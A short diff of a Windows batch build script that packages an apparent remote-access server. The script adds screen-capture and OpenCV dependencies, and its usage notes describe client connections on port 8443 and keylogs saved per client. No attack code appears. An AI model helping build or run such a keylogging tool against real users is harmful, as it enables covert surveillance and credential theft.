@@ -34,7 +34,11 @@ echo Flask^>=3.0.0
 echo flask-socketio^>=5.3.0
 echo eventlet^>=0.33.0
 echo cryptography^>=41.0.0
+echo pyOpenSSL^>=24.0.0
 echo Pillow^>=10.0.0
+echo mss^>=9.0.0
+echo numpy^>=1.24.0
+echo opencv-python-headless^>=4.8.0
 ) > dist\server\requirements.txt
 
 REM Fix imports in server files
@@ -75,6 +79,7 @@ echo USAGE:
 echo - Server listens on port 8443 for client connections ^(SSL/TLS^)
 echo - Web interface runs on port 5000 ^(or custom port with --web-port^)
 echo - Keylogs are saved in: keylogs/[ClientName]/
+echo - Deleted clients list is saved in: server_data/deleted_clients.json
 echo.
 echo TROUBLESHOOTING:
 echo - If you get "ModuleNotFoundError", run: pip install -r requirements.txt
